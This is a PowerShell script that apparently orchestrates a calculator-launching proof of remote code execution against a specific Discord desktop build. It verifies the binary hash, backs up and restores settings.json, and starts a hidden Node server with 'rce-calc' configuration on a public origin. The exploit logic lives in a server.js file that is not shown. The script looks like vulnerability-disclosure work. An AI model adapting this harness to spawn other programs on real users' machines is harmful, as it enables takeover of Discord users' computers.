[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [string]$PublicOrigin,
    [ValidateRange(1024, 65535)]
    [int]$Port = 3077,
    [ValidateRange(60, 3600)]
    [int]$TimeoutSeconds = 900
)

$ErrorActionPreference = 'Stop'
$ExpectedDiscordHash = 'C14A6B393AAD5EFAF7E9CCB2BADDBE6943D00B2073D777A6786FDD5AC405722E'
$DiscordPath = Join-Path $env:LOCALAPPDATA 'Discord\app-1.0.9245\Discord.exe'
$SettingsPath = Join-Path $env:APPDATA 'discord\settings.json'
$ServerPath = Join-Path $PSScriptRoot 'server.js'
$StateDirectory = Join-Path $PSScriptRoot '.state'
$RecoveryFlag = Join-Path $StateDirectory 'recovery.ready.json'
$ServerProcess = $null
$SettingsBytes = $null
$SettingsHash = $null
$Success = $false
$Restored = $false
$PreviousEnvironment = @{}

function Restore-Settings {
    if ($null -eq $SettingsBytes) { return }
    [System.IO.File]::WriteAllBytes($SettingsPath, $SettingsBytes)
    $actual = (Get-FileHash -LiteralPath $SettingsPath -Algorithm SHA256).Hash
    if ($actual -ne $SettingsHash) { throw "settings restore hash mismatch expected=$SettingsHash actual=$actual" }
    $script:Restored = $true
}

try {
    $origin = [Uri]$PublicOrigin
    if (-not $origin.IsAbsoluteUri -or $origin.Scheme -ne 'https' -or $origin.Query -or $origin.Fragment -or $origin.AbsolutePath -ne '/') {
        throw 'PublicOrigin must be an HTTPS origin without a path, query, or fragment'
    }
    $PublicOrigin = $origin.GetLeftPart([UriPartial]::Authority)
    if (-not (Test-Path -LiteralPath $DiscordPath -PathType Leaf)) { throw "tested Discord build is missing: $DiscordPath" }
    $discordHash = (Get-FileHash -LiteralPath $DiscordPath -Algorithm SHA256).Hash
    if ($discordHash -ne $ExpectedDiscordHash) { throw "Discord hash mismatch expected=$ExpectedDiscordHash actual=$discordHash" }
    if (-not (Test-Path -LiteralPath $SettingsPath -PathType Leaf)) { throw "Discord settings are missing: $SettingsPath" }
    if (-not (Test-Path -LiteralPath $ServerPath -PathType Leaf)) { throw "server is missing: $ServerPath" }
    $node = (Get-Command node -ErrorAction Stop).Source
    $browser = @(Get-CimInstance Win32_Process -Filter "Name = 'Discord.exe'" | Where-Object { $_.ExecutablePath -eq $DiscordPath -and $_.CommandLine -notmatch '--type=' })
    if ($browser.Count -ne 1) { throw 'start exactly one stock Discord instance before running the proof server' }
    $existingCalculator = @(Get-Process -Name calc,CalculatorApp -ErrorAction SilentlyContinue)
    if ($existingCalculator.Count -gt 0) { throw "close Calculator before starting; existing PIDs: $($existingCalculator.Id -join ',')" }
    if (Get-NetTCPConnection -LocalPort $Port -State Listen -ErrorAction SilentlyContinue) { throw "port $Port already has a listener" }

    New-Item -ItemType Directory -Path $StateDirectory -Force | Out-Null
    New-Item -ItemType Directory -Path (Join-Path $PSScriptRoot 'logs') -Force | Out-Null
    $SettingsBytes = [System.IO.File]::ReadAllBytes($SettingsPath)
    $SettingsHash = (Get-FileHash -LiteralPath $SettingsPath -Algorithm SHA256).Hash
    $stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
    $backupPath = Join-Path $StateDirectory "settings-$stamp.backup.json"
    [System.IO.File]::WriteAllBytes($backupPath, $SettingsBytes)
    Remove-Item -LiteralPath $RecoveryFlag -Force -ErrorAction SilentlyContinue
    $stdout = Join-Path $StateDirectory "server-$stamp.stdout.log"
    $stderr = Join-Path $StateDirectory "server-$stamp.stderr.log"

    $values = [ordered]@{
        ACTIVITY_PORT = [string]$Port
        ACTIVITY_PUBLIC_ORIGIN = $PublicOrigin
        ACTIVITY_MODE_OVERRIDE = 'rce-calc'
        ACTIVITY_CANDIDATE_OVERRIDE = '71ef5'
        ACTIVITY_PROTOCOL_MIN_INSTANCES = '1'
        ACTIVITY_PROTOCOL_LEASE_MS = '300000'
        ACTIVITY_RCE_NATIVE_CANDIDATES = '71ef5,71dcd'
        ACTIVITY_RCE_SPAWN_PATH = (Join-Path $env:WINDIR 'System32\calc.exe')
        ACTIVITY_RCE_RECOVERY_FLAG = $RecoveryFlag
    }
    foreach ($entry in $values.GetEnumerator()) {
        $PreviousEnvironment[$entry.Key] = [Environment]::GetEnvironmentVariable($entry.Key, 'Process')
        [Environment]::SetEnvironmentVariable($entry.Key, $entry.Value, 'Process')
    }

    $ServerProcess = Start-Process -FilePath $node -ArgumentList @($ServerPath) -WorkingDirectory $PSScriptRoot -WindowStyle Hidden -RedirectStandardOutput $stdout -RedirectStandardError $stderr -PassThru
    $healthDeadline = (Get-Date).AddSeconds(15)
    do {
        Start-Sleep -Milliseconds 200
        $ServerProcess.Refresh()
        if ($ServerProcess.HasExited) { throw "server exited with code $($ServerProcess.ExitCode): $(Get-Content -LiteralPath $stderr -Raw -ErrorAction SilentlyContinue)" }
        try { $health = Invoke-RestMethod -Uri "http://127.0.0.1:$Port/health" -TimeoutSec 2 } catch { $health = $null }
    } until ($health -or (Get-Date) -ge $healthDeadline)
    if (-not $health) { throw 'server health check timed out' }

    Write-Host "Server ready on http://127.0.0.1:$Port/"
    Write-Host "Public origin: $PublicOrigin"
    Write-Host 'Launch the configured Activity in stock Discord, wait for lease-granted, then press Run Calculator proof once.'

    $deadline = (Get-Date).AddSeconds($TimeoutSeconds)
    $calculatorPids = @()
    while ((Get-Date) -lt $deadline) {
        $ServerProcess.Refresh()
        if ($ServerProcess.HasExited) { throw "server exited with code $($ServerProcess.ExitCode)" }
        try { $state = Invoke-RestMethod -Uri "http://127.0.0.1:$Port/rce/state" -TimeoutSec 2 } catch { $state = $null }
        $calculatorPids = @(Get-Process -Name calc,CalculatorApp -ErrorAction SilentlyContinue | ForEach-Object { $_.Id })
        if ($state -and [bool]$state.nativeExitSuccess -and -not $Restored) {
            Restore-Settings
            $recovery = [ordered]@{
                ready = [DateTimeOffset]::Now.ToString('o')
                reason = 'native-exit-success'
                settingsSha256 = $SettingsHash
            } | ConvertTo-Json -Compress
            [System.IO.File]::WriteAllText($RecoveryFlag, $recovery, [System.Text.UTF8Encoding]::new($false))
        }
        if ($state -and [bool]$state.nativeExitSuccess -and [bool]$state.recoveryRelaunchRequested -and $calculatorPids.Count -gt 0) {
            $Success = $true
            break
        }
        Start-Sleep -Milliseconds 250
    }
    if (-not $Success) { throw 'proof timed out before native execution and recovery completed' }
    Write-Host "Calculator observed: $($calculatorPids -join ',')"
    Write-Host "Settings restored: $SettingsHash"
    Write-Host "Server log: $stdout"
} finally {
    if ($null -ne $SettingsBytes -and -not $Restored) { Restore-Settings }
    if ($null -ne $ServerProcess) {
        $ServerProcess.Refresh()
        if (-not $ServerProcess.HasExited) { Stop-Process -Id $ServerProcess.Id -Force -ErrorAction SilentlyContinue }
    }
    foreach ($key in $PreviousEnvironment.Keys) {
        [Environment]::SetEnvironmentVariable($key, $PreviousEnvironment[$key], 'Process')
    }
}

if (-not $Success) { exit 1 }
